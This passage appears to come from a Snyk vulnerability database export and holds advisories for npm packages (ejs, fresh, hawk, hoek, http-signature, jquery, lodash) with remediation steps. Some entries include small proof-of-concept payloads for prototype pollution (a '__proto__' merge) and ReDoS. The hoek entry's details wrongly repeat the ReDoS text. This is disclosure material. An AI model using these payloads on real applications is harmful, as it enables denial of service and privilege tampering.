        "description": "## Overview\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\nAffected versions of the package are vulnerable to _Denial of Service_ by letting the attacker under certain conditions control and override the `localNames` option causing it to crash.\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\n\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) vulnerabilities caused by the same behaviour.\n\n## Details\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\n\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\n```js\nejs.render(str, data, options);\n\nejs.renderFile(filename, data, options, callback)\n```\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\n```js\nejs.render(str, dataAndOptions);\n\nejs.renderFile(filename, dataAndOptions, callback)\n```\n\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `localNames` option, which will cause the renderer to crash.\n\n```js\nejs.renderFile('my-template', {localNames:'try'}, callback);\n```\n\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\n\n## Disclosure Timeline\n- November 28th, 2016 - Reported the issue to package owner.\n- November 28th, 2016 - Issue acknowledged by package owner.\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\n\n## Remediation\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\n\n## References\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\n",
        "created_at": "2016-11-28T18:44:12Z",
        "updated_at": "2024-03-11T09:46:33Z",
        "problems": [
          {
            "id": "CVE-2017-1000189",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.5.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.5.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.5.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2016-11-27T22:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-12-06T15:00:00Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f",
                "title": "GitHub Commit"
              },
              {
                "url": "https://snyk.io/blog/fixing-ejs-rce-vuln",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:fresh:20170908",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\r\n[`fresh`](https://www.npmjs.com/package/fresh) is HTTP response freshness testing.\r\n\r\nAffected versions of this package are vulnerable to Regular expression Denial of Service (ReDoS) attacks. A Regular Expression (`/ *, */`) was used for parsing HTTP headers and take about 2 seconds matching time for 50k characters.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `fresh` to version 0.5.2 or higher.\n\n## References\n- [https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec](https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec)\n- [https://github.com/jshttp/fresh/issues/24](https://github.com/jshttp/fresh/issues/24)\n",
        "created_at": "2017-09-27T08:48:49Z",
        "updated_at": "2024-03-11T09:47:01Z",
        "problems": [
          {
            "id": "CVE-2017-16119",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.5.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.5.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.5.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2017-09-08T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-09-27T08:48:49Z",
            "references": [
              {
                "url": "https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/jshttp/fresh/issues/24",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:hawk:20160119",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\r\n[`hawk`](https://www.npmjs.com/package/hawk) is an HTTP authentication scheme using a message authentication code (MAC) algorithm to provide partial HTTP request cryptographic verification.\r\n\r\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\nYou can read more about `Regular Expression Denial of Service (ReDoS)` on our [blog](https://snyk.io/blog/redos-and-catastrophic-backtracking/).\r\n\r\n## References\r\n- [GitHub Issue](https://github.com/hueniverse/hawk/issues/168)",
        "created_at": "2016-01-19T23:24:51Z",
        "updated_at": "2024-03-11T09:48:53Z",
        "problems": [
          {
            "id": "CVE-2016-2515",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.1.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.1.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.1.3,>=4.0.0 <4.1.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2016-01-19T21:51:35Z",
            "exploit": "Not Defined",
            "publication_time": "2016-01-19T23:24:51Z",
            "references": [
              {
                "url": "https://github.com/hapijs/hawk/commit/0833f99ba64558525995a7e21d4093da1f3e15fa",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/hueniverse/hawk/issues/168",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:hoek:20180212",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[hoek](https://github.com/hapijs/hoek) is an Utility methods for the hapi ecosystem.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.  \r\n\r\n## PoC by Olivier Arteau (HoLyVieR)\r\n```js\r\nvar Hoek = require('hoek');\r\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\r\n\r\nvar a = {};\r\nconsole.log(\"Before : \" + a.oops);\r\nHoek.merge({}, JSON.parse(malicious_payload));\r\nconsole.log(\"After : \" + a.oops);\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `hoek` to version 4.2.1, 5.0.3 or higher.\n## References\n- [GitHub Commit](https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee)\n- [GitHub Commit](https://github.com/hapijs/hoek/commit/5aed1a8c4a3d55722d1c799f2368857bf418d6df)\n- [GitHub Issue](https://github.com/hapijs/hoek/issues/230)\n- [GitHub PR](https://github.com/hapijs/hoek/pull/227)\n- [HackerOne Report](https://hackerone.com/reports/310439)\n- [NPM Security Advisory](http://npmjs.com/advisories/566)\n",
        "created_at": "2018-02-12T22:28:27Z",
        "updated_at": "2024-03-11T09:53:48Z",
        "problems": [
          {
            "id": "CVE-2018-3728",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.2.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.2.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.2.1,>=5.0.0 <5.0.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2018-02-12T22:28:27Z",
            "exploit": "Proof of Concept",
            "publication_time": "2018-02-14T13:22:50Z",
            "references": [
              {
                "url": "https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/hapijs/hoek/commit/5aed1a8c4a3d55722d1c799f2368857bf418d6df",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/hapijs/hoek/issues/230",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/hapijs/hoek/pull/227",
                "title": "GitHub PR"
              },
              {
                "url": "https://hackerone.com/reports/310439",
                "title": "HackerOne Report"
              },
              {
                "url": "http://npmjs.com/advisories/566",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:http-signature:20150122",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Timing Attack",
        "description": "## Overview\r\n[`http-signature`](https://www.npmjs.com/package/http-signature) is a reference implementation of Joyent's HTTP Signature scheme.\r\n\r\nAffected versions of the package are vulnerable to Timing Attacks due to time-variable comparison of signatures. \r\n\r\nThe library implemented a character to character comparison, similar to the built-in string comparison mechanism, `===`, and not a time constant string comparison. As a result, the comparison will fail faster when the first characters in the signature are incorrect.\r\nAn attacker can use this difference to perform a timing attack, essentially allowing them to guess the signature one character at a time.\r\n\r\nYou can read more about timing attacks in Node.js on the [Snyk blog](https://snyk.io/blog/node-js-timing-attack-ccc-ctf/).\r\n\r\n## Remediation\r\nUpgrade `http-signature` to version 1.0.0 or higher.\r\n\r\n## References\r\n- [Github PR](https://github.com/joyent/node-http-signature/pull/36)\r\n- [Github Commit](https://github.com/joyent/node-http-signature/commit/78ab1da232f31f695f5c362d863593a143aa8b56)",
        "created_at": "2017-06-28T13:07:29Z",
        "updated_at": "2024-03-06T14:01:14Z",
        "problems": [
          {
            "id": "CWE-310",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2015-01-21T22:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-06-28T13:07:29Z",
            "references": [
              {
                "url": "https://github.com/joyent/node-http-signature/commit/78ab1da232f31f695f5c362d863593a143aa8b56",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/joyent/node-http-signature/pull/36",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:jquery:20150627",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nattacks when a cross-domain ajax request is performed without the `dataType` option causing `text/javascript` responses to be executed.\r\n\r\n**Note:** After being implemented in version 1.12.0, the fix of this vulnerability was reverted in 1.12.3, and then was only reintroduced in version 3.0.0-beta1. The fix was never released in any tag of the 2.x.x branch, as it was reverted out of the branch before being released.\r\n\r\n**Note:** CVE-2017-16012 is a duplicate of CVE-2015-9251\n\n## Details\n A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `jquery` to version 1.12.0, 3.0.0-beta1 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc)\n\n- [GitHub Commit](https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2)\n\n- [GitHub Issue](https://github.com/jquery/jquery/issues/2432)\n\n- [GitHub PR](https://github.com/jquery/jquery/pull/2588)\n",
        "created_at": "2016-11-06T15:12:44Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2015-9251",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.12.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.12.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.12.0,>=1.12.3 <3.0.0-beta1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2015-06-26T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-11-27T00:00:00Z",
            "references": [
              {
                "url": "https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/jquery/jquery/issues/2432",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/jquery/jquery/pull/2588",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:lodash:20180130",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.  \r\n\r\n## PoC by Olivier Arteau (HoLyVieR)\r\n```js\r\nvar _= require('lodash');\r\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\r\n\r\nvar a = {};\r\nconsole.log(\"Before : \" + a.oops);\r\n_.merge({}, JSON.parse(malicious_payload));\r\nconsole.log(\"After : \" + a.oops);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best 